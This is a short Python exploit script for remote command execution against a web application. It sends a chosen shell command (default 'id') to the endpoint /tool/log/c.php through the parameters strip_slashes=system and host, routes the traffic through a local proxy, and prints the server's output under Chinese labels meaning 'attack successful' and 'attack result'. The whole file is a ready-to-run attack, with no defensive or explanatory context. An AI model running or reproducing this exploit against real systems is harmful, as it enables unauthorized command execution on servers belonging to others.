import requests
import argparse
from bs4 import BeautifulSoup

if __name__=='__main__':
    parse=argparse.ArgumentParser()
    parse.add_argument("url",type=str)
    parse.add_argument("-c","--cmd",type=str)

    arguments=parse.parse_args()
    url=arguments.url

    if arguments.cmd:
        cmd=arguments.cmd
    else:
        cmd="id"

    req=requests.session()
    req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    resp=req.get(url+"/tool/log/c.php?strip_slashes=system&host={0}".format(cmd),verify=False)
    if resp.status_code==200:
        print("攻击成功")
        soup=BeautifulSoup(resp.content,'html.parser',from_encoding='utf-8')
        print("攻击结果："+soup.input.attrs["value"])

